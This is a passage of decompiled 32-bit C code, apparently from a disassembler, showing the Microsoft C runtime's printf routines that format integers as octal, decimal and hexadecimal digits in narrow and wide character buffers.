    "    v16 = *(_DWORD *)(this + 8);",
    "    v15 = *(_DWORD *)(this + 36);",
    "    *(_DWORD *)(this + 28) = v7 & 0xFFFFFFF7;",
    "    sub_1001937A((_DWORD *)(this + 60), v15, v16);",
    "    v14 = v20;",
    "    v13 = v19;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 36) = 1;",
    "  }",
    "  if ( !__PAIR64__(v14, v13) )",
    "    *(_DWORD *)(this + 28) &= ~0x20u;",
    "  *(_BYTE *)(this + 56) = 0;",
    "  if ( v17 == 8 )",
    "    sub_1001A9A9(v14, v13, a2);",
    "  else",
    "    sub_1001A6BB(v14, a2);",
    "  if ( (*(_DWORD *)(this + 28) & 0x80) != 0 && (!*(_DWORD *)(this + 52) || **(_BYTE **)(this + 48) != 48) )",
    "  {",
    "    *(_BYTE *)--*(_DWORD *)(this + 48) = 48;",
    "    ++*(_DWORD *)(this + 52);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_10019EEB(int this, int a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // eax",
    "  __int64 *v6; // ecx",
    "  int v7; // edi",
    "  __int64 v8; // rax",
    "  _DWORD *v9; // eax",
    "  _DWORD *v10; // ecx",
    "  unsigned __int16 *v11; // ecx",
    "  unsigned __int8 *v12; // ecx",
    "  unsigned int v13; // edx",
    "  int v14; // ecx",
    "  unsigned int v15; // [esp-8h] [ebp-20h]",
    "  int v16; // [esp-4h] [ebp-1Ch]",
    "  int v17; // [esp+Ch] [ebp-Ch]",
    "  int v18; // [esp+10h] [ebp-8h]",
    "  unsigned int v19; // [esp+10h] [ebp-8h]",
    "  int v20; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = sub_1001C178(*(_DWORD *)(this + 40));",
    "  v17 = v3;",
    "  switch ( v3 )",
    "  {",
    "    case 1:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v12 = *(unsigned __int8 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v12 + 4;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (char)*v12;",
    "      else",
    "        LODWORD(v8) = *v12;",
    "      break;",
    "    case 2:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v11 = *(unsigned __int16 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v11 + 2;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (__int16)*v11;",
    "      else",
    "        LODWORD(v8) = *v11;",
    "      break;",
    "    case 4:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      if ( (v7 & 0x10) == 0 )",
    "      {",
    "        v10 = *(_DWORD **)(this + 16);",
    "        v18 = 0;",
    "        *(_DWORD *)(this + 16) = v10 + 1;",
    "        LODWORD(v8) = *v10;",
    "        goto LABEL_18;",
    "      }",
    "      v9 = *(_DWORD **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v9 + 1;",
    "      LODWORD(v8) = *v9;",
    "      break;",
    "    case 8:",
    "      v6 = *(__int64 **)(this + 16);",
    "      v7 = *(_DWORD *)(this + 28);",
    "      *(_DWORD *)(this + 16) = v6 + 1;",
    "      v8 = *v6;",
    "      goto LABEL_17;",
    "    default:",
    "      v4 = *(_DWORD *)(this + 8) + 24;",
    "      *(_BYTE *)(v4 + 4) = 1;",
    "      *(_DWORD *)v4 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "      return 0;",
    "  }",
    "  v8 = (int)v8;",
    "LABEL_17:",
    "  v18 = HIDWORD(v8);",
    "LABEL_18:",
    "  v13 = v18;",
    "  v14 = v8;",
    "  if ( (v7 & 0x10) != 0 && v18 < 0 )",
    "  {",
    "    v14 = -(int)v8;",
    "    v13 = (unsigned __int64)-__SPAIR64__(v18, v8) >> 32;",
    "    v7 |= 0x40u;",
    "    *(_DWORD *)(this + 28) = v7;",
    "  }",
    "  v19 = v13;",
    "  v20 = v14;",
    "  if ( *(int *)(this + 36) >= 0 )",
    "  {",
    "    v16 = *(_DWORD *)(this + 8);",
    "    v15 = *(_DWORD *)(this + 36);",
    "    *(_DWORD *)(this + 28) = v7 & 0xFFFFFFF7;",
    "    sub_100193FA((_DWORD *)(this + 60), v15, v16);",
    "    v14 = v20;",
    "    v13 = v19;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 36) = 1;",
    "  }",
    "  if ( !__PAIR64__(v14, v13) )",
    "    *(_DWORD *)(this + 28) &= ~0x20u;",
    "  *(_BYTE *)(this + 56) = 1;",
    "  if ( v17 == 8 )",
    "    sub_1001AA1D(v14, v13, a2);",
    "  else",
    "    sub_1001A71D(v14, a2);",
    "  if ( (*(_DWORD *)(this + 28) & 0x80) != 0 && (!*(_DWORD *)(this + 52) || **(_WORD **)(this + 48) != 48) )",
    "  {",
    "    *(_DWORD *)(this + 48) -= 2;",
    "    **(_WORD **)(this + 48) = 48;",
    "    ++*(_DWORD *)(this + 52);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001A07D(int this, char a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // eax",
    "  __int64 *v6; // ecx",
    "  int v7; // edi",
    "  __int64 v8; // rax",
    "  _DWORD *v9; // eax",
    "  _DWORD *v10; // ecx",
    "  unsigned __int16 *v11; // ecx",
    "  unsigned __int8 *v12; // ecx",
    "  unsigned int v13; // edx",
    "  int v14; // ecx",
    "  unsigned int v15; // [esp-8h] [ebp-20h]",
    "  int v16; // [esp-4h] [ebp-1Ch]",
    "  int v17; // [esp+Ch] [ebp-Ch]",
    "  int v18; // [esp+10h] [ebp-8h]",
    "  unsigned int v19; // [esp+10h] [ebp-8h]",
    "  int v20; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = sub_1001C178(*(_DWORD *)(this + 40));",
    "  v17 = v3;",
    "  switch ( v3 )",
    "  {",
    "    case 1:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v12 = *(unsigned __int8 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v12 + 4;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (char)*v12;",
    "      else",
    "        LODWORD(v8) = *v12;",
    "      break;",
    "    case 2:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v11 = *(unsigned __int16 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v11 + 2;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (__int16)*v11;",
    "      else",
    "        LODWORD(v8) = *v11;",
    "      break;",
    "    case 4:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      if ( (v7 & 0x10) == 0 )",
    "      {",
    "        v10 = *(_DWORD **)(this + 16);",
    "        v18 = 0;",
    "        *(_DWORD *)(this + 16) = v10 + 1;",
    "        LODWORD(v8) = *v10;",
    "        goto LABEL_18;",
    "      }",
    "      v9 = *(_DWORD **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v9 + 1;",
    "      LODWORD(v8) = *v9;",
    "      break;",
    "    case 8:",
    "      v6 = *(__int64 **)(this + 16);",
    "      v7 = *(_DWORD *)(this + 28);",
    "      *(_DWORD *)(this + 16) = v6 + 1;",
    "      v8 = *v6;",
    "      goto LABEL_17;",
    "    default:",
    "      v4 = *(_DWORD *)(this + 8) + 24;",
    "      *(_BYTE *)(v4 + 4) = 1;",
    "      *(_DWORD *)v4 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "      return 0;",
    "  }",
    "  v8 = (int)v8;",
    "LABEL_17:",
    "  v18 = HIDWORD(v8);",
    "LABEL_18:",
    "  v13 = v18;",
    "  v14 = v8;",
    "  if ( (v7 & 0x10) != 0 && v18 < 0 )",
    "  {",
    "    v14 = -(int)v8;",
    "    v13 = (unsigned __int64)-__SPAIR64__(v18, v8) >> 32;",
    "    v7 |= 0x40u;",
    "    *(_DWORD *)(this + 28) = v7;",
    "  }",
    "  v19 = v13;",
    "  v20 = v14;",
    "  if ( *(int *)(this + 36) >= 0 )",
    "  {",
    "    v16 = *(_DWORD *)(this + 8);",
    "    v15 = *(_DWORD *)(this + 36);",
    "    *(_DWORD *)(this + 28) = v7 & 0xFFFFFFF7;",
    "    sub_1001937A((_DWORD *)(this + 60), v15, v16);",
    "    v14 = v20;",
    "    v13 = v19;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 36) = 1;",
    "  }",
    "  if ( !__PAIR64__(v14, v13) )",
    "    *(_DWORD *)(this + 28) &= ~0x20u;",
    "  *(_BYTE *)(this + 56) = 0;",
    "  if ( v17 == 8 )",
    "    sub_1001AA9D(v14, v13, a2);",
    "  else",
    "    sub_1001A78E(v14, a2);",
    "  if ( (*(_DWORD *)(this + 28) & 0x80) != 0 && (!*(_DWORD *)(this + 52) || **(_BYTE **)(this + 48) != 48) )",
    "  {",
    "    *(_BYTE *)--*(_DWORD *)(this + 48) = 48;",
    "    ++*(_DWORD *)(this + 52);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001A20A(int this, char a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // eax",
    "  __int64 *v6; // ecx",
    "  int v7; // edi",
    "  __int64 v8; // rax",
    "  _DWORD *v9; // eax",
    "  _DWORD *v10; // ecx",
    "  unsigned __int16 *v11; // ecx",
    "  unsigned __int8 *v12; // ecx",
    "  unsigned int v13; // edx",
    "  int v14; // ecx",
    "  unsigned int v15; // [esp-8h] [ebp-20h]",
    "  int v16; // [esp-4h] [ebp-1Ch]",
    "  int v17; // [esp+Ch] [ebp-Ch]",
    "  int v18; // [esp+10h] [ebp-8h]",
    "  unsigned int v19; // [esp+10h] [ebp-8h]",
    "  int v20; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = sub_1001C178(*(_DWORD *)(this + 40));",
    "  v17 = v3;",
    "  switch ( v3 )",
    "  {",
    "    case 1:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v12 = *(unsigned __int8 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v12 + 4;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (char)*v12;",
    "      else",
    "        LODWORD(v8) = *v12;",
    "      break;",
    "    case 2:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v11 = *(unsigned __int16 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v11 + 2;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (__int16)*v11;",
    "      else",
    "        LODWORD(v8) = *v11;",
    "      break;",
    "    case 4:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      if ( (v7 & 0x10) == 0 )",
    "      {",
    "        v10 = *(_DWORD **)(this + 16);",
    "        v18 = 0;",
    "        *(_DWORD *)(this + 16) = v10 + 1;",
    "        LODWORD(v8) = *v10;",
    "        goto LABEL_18;",
    "      }",
    "      v9 = *(_DWORD **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v9 + 1;",
    "      LODWORD(v8) = *v9;",
    "      break;",
    "    case 8:",
    "      v6 = *(__int64 **)(this + 16);",
    "      v7 = *(_DWORD *)(this + 28);",
    "      *(_DWORD *)(this + 16) = v6 + 1;",
    "      v8 = *v6;",
    "      goto LABEL_17;",
    "    default:",
    "      v4 = *(_DWORD *)(this + 8) + 24;",
    "      *(_BYTE *)(v4 + 4) = 1;",
    "      *(_DWORD *)v4 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "      return 0;",
    "  }",
    "  v8 = (int)v8;",
    "LABEL_17:",
    "  v18 = HIDWORD(v8);",
    "LABEL_18:",
    "  v13 = v18;",
    "  v14 = v8;",
    "  if ( (v7 & 0x10) != 0 && v18 < 0 )",
    "  {",
    "    v14 = -(int)v8;",
    "    v13 = (unsigned __int64)-__SPAIR64__(v18, v8) >> 32;",
    "    v7 |= 0x40u;",
    "    *(_DWORD *)(this + 28) = v7;",
    "  }",
    "  v19 = v13;",
    "  v20 = v14;",
    "  if ( *(int *)(this + 36) >= 0 )",
    "  {",
    "    v16 = *(_DWORD *)(this + 8);",
    "    v15 = *(_DWORD *)(this + 36);",
    "    *(_DWORD *)(this + 28) = v7 & 0xFFFFFFF7;",
    "    sub_100193FA((_DWORD *)(this + 60), v15, v16);",
    "    v14 = v20;",
    "    v13 = v19;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 36) = 1;",
    "  }",
    "  if ( !__PAIR64__(v14, v13) )",
    "    *(_DWORD *)(this + 28) &= ~0x20u;",
    "  *(_BYTE *)(this + 56) = 1;",
    "  if ( v17 == 8 )",
    "    sub_1001AB2F(v14, v13, a2);",
    "  else",
    "    sub_1001A80D(v14, a2);",
    "  if ( (*(_DWORD *)(this + 28) & 0x80) != 0 && (!*(_DWORD *)(this + 52) || **(_WORD **)(this + 48) != 48) )",
    "  {",
    "    *(_DWORD *)(this + 48) -= 2;",
    "    **(_WORD **)(this + 48) = 48;",
    "    ++*(_DWORD *)(this + 52);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001A39C(int this, char a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // eax",
    "  __int64 *v6; // ecx",
    "  int v7; // edi",
    "  __int64 v8; // rax",
    "  _DWORD *v9; // eax",
    "  _DWORD *v10; // ecx",
    "  unsigned __int16 *v11; // ecx",
    "  unsigned __int8 *v12; // ecx",
    "  unsigned int v13; // edx",
    "  int v14; // ecx",
    "  unsigned int v15; // [esp-8h] [ebp-20h]",
    "  int v16; // [esp-4h] [ebp-1Ch]",
    "  int v17; // [esp+Ch] [ebp-Ch]",
    "  int v18; // [esp+10h] [ebp-8h]",
    "  unsigned int v19; // [esp+10h] [ebp-8h]",
    "  int v20; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = sub_1001C178(*(_DWORD *)(this + 40));",
    "  v17 = v3;",
    "  switch ( v3 )",
    "  {",
    "    case 1:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v12 = *(unsigned __int8 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v12 + 4;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (char)*v12;",
    "      else",
    "        LODWORD(v8) = *v12;",
    "      break;",
    "    case 2:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v11 = *(unsigned __int16 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v11 + 2;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (__int16)*v11;",
    "      else",
    "        LODWORD(v8) = *v11;",
    "      break;",
    "    case 4:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      if ( (v7 & 0x10) == 0 )",
    "      {",
    "        v10 = *(_DWORD **)(this + 16);",
    "        v18 = 0;",
    "        *(_DWORD *)(this + 16) = v10 + 1;",
    "        LODWORD(v8) = *v10;",
    "        goto LABEL_18;",
    "      }",
    "      v9 = *(_DWORD **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v9 + 1;",
    "      LODWORD(v8) = *v9;",
    "      break;",
    "    case 8:",
    "      v6 = *(__int64 **)(this + 16);",
    "      v7 = *(_DWORD *)(this + 28);",
    "      *(_DWORD *)(this + 16) = v6 + 1;",
    "      v8 = *v6;",
    "      goto LABEL_17;",
    "    default:",
    "      v4 = *(_DWORD *)(this + 8) + 24;",
    "      *(_BYTE *)(v4 + 4) = 1;",
    "      *(_DWORD *)v4 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "      return 0;",
    "  }",
    "  v8 = (int)v8;",
    "LABEL_17:",
    "  v18 = HIDWORD(v8);",
    "LABEL_18:",
    "  v13 = v18;",
    "  v14 = v8;",
    "  if ( (v7 & 0x10) != 0 && v18 < 0 )",
    "  {",
    "    v14 = -(int)v8;",
    "    v13 = (unsigned __int64)-__SPAIR64__(v18, v8) >> 32;",
    "    v7 |= 0x40u;",
    "    *(_DWORD *)(this + 28) = v7;",
    "  }",
    "  v19 = v13;",
    "  v20 = v14;",
    "  if ( *(int *)(this + 36) >= 0 )",
    "  {",
    "    v16 = *(_DWORD *)(this + 8);",
    "    v15 = *(_DWORD *)(this + 36);",
    "    *(_DWORD *)(this + 28) = v7 & 0xFFFFFFF7;",
    "    sub_1001937A((_DWORD *)(this + 60), v15, v16);",
    "    v14 = v20;",
    "    v13 = v19;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 36) = 1;",
    "  }",
    "  if ( !__PAIR64__(v14, v13) )",
    "    *(_DWORD *)(this + 28) &= ~0x20u;",
    "  *(_BYTE *)(this + 56) = 0;",
    "  if ( v17 == 8 )",
    "    sub_1001ABD4(v14, v13, a2);",
    "  else",
    "    sub_1001A8A2(v14, a2);",
    "  if ( (*(_DWORD *)(this + 28) & 0x80) != 0 && (!*(_DWORD *)(this + 52) || **(_BYTE **)(this + 48) != 48) )",
    "  {",
    "    *(_BYTE *)--*(_DWORD *)(this + 48) = 48;",
    "    ++*(_DWORD *)(this + 52);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __thiscall sub_1001A529(int this, char a2)",
    "{",
    "  int v3; // eax",
    "  int v4; // eax",
    "  __int64 *v6; // ecx",
    "  int v7; // edi",
    "  __int64 v8; // rax",
    "  _DWORD *v9; // eax",
    "  _DWORD *v10; // ecx",
    "  unsigned __int16 *v11; // ecx",
    "  unsigned __int8 *v12; // ecx",
    "  unsigned int v13; // edx",
    "  int v14; // ecx",
    "  unsigned int v15; // [esp-8h] [ebp-20h]",
    "  int v16; // [esp-4h] [ebp-1Ch]",
    "  int v17; // [esp+Ch] [ebp-Ch]",
    "  int v18; // [esp+10h] [ebp-8h]",
    "  unsigned int v19; // [esp+10h] [ebp-8h]",
    "  int v20; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = sub_1001C178(*(_DWORD *)(this + 40));",
    "  v17 = v3;",
    "  switch ( v3 )",
    "  {",
    "    case 1:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v12 = *(unsigned __int8 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v12 + 4;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (char)*v12;",
    "      else",
    "        LODWORD(v8) = *v12;",
    "      break;",
    "    case 2:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      v11 = *(unsigned __int16 **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v11 + 2;",
    "      if ( (v7 & 0x10) != 0 )",
    "        LODWORD(v8) = (__int16)*v11;",
    "      else",
    "        LODWORD(v8) = *v11;",
    "      break;",
    "    case 4:",
    "      v7 = *(_DWORD *)(this + 28);",
    "      if ( (v7 & 0x10) == 0 )",
    "      {",
    "        v10 = *(_DWORD **)(this + 16);",
    "        v18 = 0;",
    "        *(_DWORD *)(this + 16) = v10 + 1;",
    "        LODWORD(v8) = *v10;",
    "        goto LABEL_18;",
    "      }",
    "      v9 = *(_DWORD **)(this + 16);",
    "      *(_DWORD *)(this + 16) = v9 + 1;",
    "      LODWORD(v8) = *v9;",
    "      break;",
    "    case 8:",
    "      v6 = *(__int64 **)(this + 16);",
    "      v7 = *(_DWORD *)(this + 28);",
    "      *(_DWORD *)(this + 16) = v6 + 1;",
    "      v8 = *v6;",
    "      goto LABEL_17;",
    "    default:",
    "      v4 = *(_DWORD *)(this + 8) + 24;",
    "      *(_BYTE *)(v4 + 4) = 1;",
    "      *(_DWORD *)v4 = 22;",
    "      _invalid_parameter_internal(0, 0, 0, 0, 0, *(struct __acrt_ptd ***)(this + 8));",
    "      return 0;",
    "  }",
    "  v8 = (int)v8;",
    "LABEL_17:",
    "  v18 = HIDWORD(v8);",
    "LABEL_18:",
    "  v13 = v18;",
    "  v14 = v8;",
    "  if ( (v7 & 0x10) != 0 && v18 < 0 )",
    "  {",
    "    v14 = -(int)v8;",
    "    v13 = (unsigned __int64)-__SPAIR64__(v18, v8) >> 32;",
    "    v7 |= 0x40u;",
    "    *(_DWORD *)(this + 28) = v7;",
    "  }",
    "  v19 = v13;",
    "  v20 = v14;",
    "  if ( *(int *)(this + 36) >= 0 )",
    "  {",
    "    v16 = *(_DWORD *)(this + 8);",
    "    v15 = *(_DWORD *)(this + 36);",
    "    *(_DWORD *)(this + 28) = v7 & 0xFFFFFFF7;",
    "    sub_100193FA((_DWORD *)(this + 60), v15, v16);",
    "    v14 = v20;",
    "    v13 = v19;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(this + 36) = 1;",
    "  }",
    "  if ( !__PAIR64__(v14, v13) )",
    "    *(_DWORD *)(this + 28) &= ~0x20u;",
    "  *(_BYTE *)(this + 56) = 1;",
    "  if ( v17 == 8 )",
    "    sub_1001AC5A(v14, v13, a2);",
    "  else",
    "    sub_1001A91E(v14, a2);",
    "  if ( (*(_DWORD *)(this + 28) & 0x80) != 0 && (!*(_DWORD *)(this + 52) || **(_WORD **)(this + 48) != 48) )",
    "  {",
    "    *(_DWORD *)(this + 48) -= 2;",
    "    **(_WORD **)(this + 48) = 48;",
    "    ++*(_DWORD *)(this + 52);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "_BYTE *__thiscall sub_1001A6BB(_DWORD *this, unsigned int a2, int a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  int v6; // eax",
    "  _BYTE *v8; // ecx",
    "  _BYTE *v9; // eax",
    "  _BYTE *i; // ebx",
    "  int v11; // esi",
    "  char v12; // al",
    "  int v13; // ecx",
    "  _BYTE *result; // eax",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v6 = __crt_stdio_output::formatting_buffer::count<char>(v4);",
    "  v8 = (char *)v5 + v6 - 1;",
    "  this[12] = v8;",
    "  v9 = v8;",
    "  for ( i = v8; ; i = v9 )",
    "  {",
    "    v11 = this[9];",
    "    if ( v11 <= 0 && !a2 )",
    "      break;",
    "    this[9] = v11 - 1;",
    "    v12 = a2 & 7;",
    "    a2 >>= 3;",
    "    *i = v12 + 48;",
    "    v9 = (_BYTE *)--this[12];",
    "  }",
    "  v13 = v8 - v9;",
    "  result = v9 + 1;",
    "  this[13] = v13;",
    "  this[12] = result;",
    "  return result;",
    "}",
    "",
    "",
    "_WORD *__thiscall sub_1001A71D(_DWORD *this, unsigned int a2, int a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  int v6; // ecx",
    "  _WORD *v8; // eax",
    "  int v9; // ebx",
    "  char v10; // dl",
    "  int v11; // ecx",
    "  _WORD *result; // eax",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v6 = (int)v5 + 2 * __crt_stdio_output::formatting_buffer::count<wchar_t>(v4) - 2;",
    "  v8 = (_WORD *)v6;",
    "  for ( this[12] = v6; ; v8 = (_WORD *)this[12] )",
    "  {",
    "    v9 = this[9];",
    "    v10 = a2;",
    "    if ( v9 <= 0 && !a2 )",
    "      break;",
    "    a2 >>= 3;",
    "    this[9] = v9 - 1;",
    "    *v8 = (v10 & 7) + 48;",
    "    this[12] -= 2;",
    "  }",
    "  v11 = (v6 - (int)v8) >> 1;",
    "  result = v8 + 1;",
    "  this[13] = v11;",
    "  this[12] = result;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__thiscall sub_1001A78E(_DWORD *this, unsigned int a2, char a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  char *v6; // eax",
    "  char *i; // ebx",
    "  int v9; // ecx",
    "  char v10; // dl",
    "  int v11; // esi",
    "  _BYTE *result; // eax",
    "  int v13; // [esp+Ch] [ebp-4h]",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v13 = (int)v5 + __crt_stdio_output::formatting_buffer::count<char>(v4) - 1;",
    "  v6 = (char *)v13;",
    "  this[12] = v13;",
    "  for ( i = (char *)v13; ; i = v6 )",
    "  {",
    "    v9 = this[9];",
    "    if ( v9 <= 0 && !a2 )",
    "      break;",
    "    this[9] = v9 - 1;",
    "    v10 = a2 % 0xA + 48;",
    "    a2 /= 0xAu;",
    "    if ( v10 > 57 )",
    "      v10 += 32 * (a3 ^ 1) + 7;",
    "    *i = v10;",
    "    v6 = (char *)--this[12];",
    "  }",
    "  v11 = v13 - (_DWORD)v6;",
    "  result = v6 + 1;",
    "  this[13] = v11;",
    "  this[12] = result;",
    "  return result;",
    "}",
    "",
    "",
    "_WORD *__thiscall sub_1001A80D(_DWORD *this, unsigned int a2, char a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  _WORD *v7; // eax",
    "  int v8; // ecx",
    "  unsigned int v9; // edx",
    "  unsigned int v10; // edx",
    "  int v11; // esi",
    "  _WORD *result; // eax",
    "  int v13; // [esp+Ch] [ebp-8h]",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v13 = (int)v5 + 2 * __crt_stdio_output::formatting_buffer::count<wchar_t>(v4) - 2;",
    "  v7 = (_WORD *)v13;",
    "  for ( this[12] = v13; ; v7 = (_WORD *)this[12] )",
    "  {",
    "    v8 = this[9];",
    "    if ( v8 <= 0 && !a2 )",
    "      break;",
    "    this[9] = v8 - 1;",
    "    v9 = a2 % 0xA;",
    "    a2 /= 0xAu;",
    "    v10 = (unsigned __int16)(v9 + 48);",
    "    if ( v10 > 0x39 )",
    "      LOBYTE(v10) = v10 + 32 * (a3 ^ 1) + 7;",
    "    *v7 = (char)v10;",
    "    this[12] -= 2;",
    "  }",
    "  v11 = (v13 - (int)v7) >> 1;",
    "  result = v7 + 1;",
    "  this[13] = v11;",
    "  this[12] = result;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__thiscall sub_1001A8A2(_DWORD *this, unsigned int a2, char a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  int v6; // eax",
    "  unsigned __int8 *v8; // ecx",
    "  unsigned __int8 *v9; // eax",
    "  int v10; // esi",
    "  char v11; // al",
    "  unsigned __int8 v12; // al",
    "  int v13; // ecx",
    "  _BYTE *result; // eax",
    "  unsigned __int8 *i; // [esp+Ch] [ebp-4h]",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v6 = __crt_stdio_output::formatting_buffer::count<char>(v4);",
    "  v8 = (unsigned __int8 *)v5 + v6 - 1;",
    "  this[12] = v8;",
    "  v9 = v8;",
    "  for ( i = v8; ; i = v9 )",
    "  {",
    "    v10 = this[9];",
    "    if ( v10 <= 0 && !a2 )",
    "      break;",
    "    this[9] = v10 - 1;",
    "    v11 = a2 & 0xF;",
    "    a2 >>= 4;",
    "    v12 = v11 + 48;",
    "    if ( v12 > 0x39u )",
    "      v12 += 32 * (a3 ^ 1) + 7;",
    "    *i = v12;",
    "    v9 = (unsigned __int8 *)--this[12];",
    "  }",
    "  v13 = v8 - v9;",
    "  result = v9 + 1;",
    "  this[13] = v13;",
    "  this[12] = result;",
    "  return result;",
    "}",
    "",
    "",
    "_WORD *__thiscall sub_1001A91E(_DWORD *this, unsigned int a2, char a3)",
    "{",
    "  _DWORD *v4; // ecx",
    "  _DWORD *v5; // esi",
    "  int v6; // ecx",
    "  _WORD *v8; // eax",
    "  _WORD *i; // ebx",
    "  int v10; // edx",
    "  __int16 v11; // ax",
    "  unsigned int v12; // edx",
    "  int v13; // ecx",
    "  _WORD *result; // eax",
    "",
    "  v4 = this + 15;",
    "  v5 = (_DWORD *)v4[257];",
    "  if ( !v5 )",
    "    v5 = v4;",
    "  v6 = (int)v5 + 2 * __crt_stdio_output::formatting_buffer::count<wchar_t>(v4) - 2;",
    "  v8 = (_WORD *)v6;",
    "  this[12] = v6;",
    "  for ( i = (_WORD *)v6; ; i = v8 )",
    "  {",
    "    v10 = this[9];",
    "    if ( v10 <= 0 && !a2 )",
    "      break;",
    "    this[9] = v10 - 1;",
    "    v11 = a2 & 0xF;",
    "    a2 >>= 4;",
    "    v12 = (unsigned __int16)(v11 + 48);",
    "    if ( v12 > 0x39 )",
    "      LOWORD(v12) = (unsigned __int8)(v11 + 48 + 32 * (a3 ^ 1) + 7);",
    "    *i = v12;",
    "    this[12] -= 2;",
    "    v8 = (_WORD *)this[12];",
    "  }",
    "  v13 = (v6 - (int)v8) >> 1;",
    "  result = v8 + 1;",
    "  this[13] = v13;",
    "  this[12] = result;",
    "  return result;",
    "}",
    "",
    "",
    "_BYTE *__thiscall sub_1001A9A9(_DWORD *this, unsigned int a2, unsigned int a3, int a4)",
    "{",
    "  _DWORD *v5; // ecx",
    "  _DWORD *v6; // esi",
    "  int v7; // eax",
    "  char *v9; // ecx",
    "  char *v11; // ecx",
    "  char *v12; // edx",
    "  int v13; // eax",
    "  char v14; // al",
    "  _BYTE *result; // eax",
    "  char *v16; // [esp+Ch] [ebp-8h]",
    "",
    "  v5 = this + 15;",
    "  v6 = (_DWORD *)v5[257];",
    "  if ( !v6 )",
    "    v6 = v5;",
    "  v7 = __crt_stdio_output::formatting_buffer::count<char>(v5);",
    "  v9 = (char *)v6 - 1;",
    "  v11 = &v9[v7];",
    "  v16 = v11;",
    "  v12 = v11;",
    "  this[12] = v11;",
    "  while ( 1 )",
    "  {",
    "    v13 = this[9];",
    "    if ( v13 > 0 )",
    "      goto LABEL_7;",
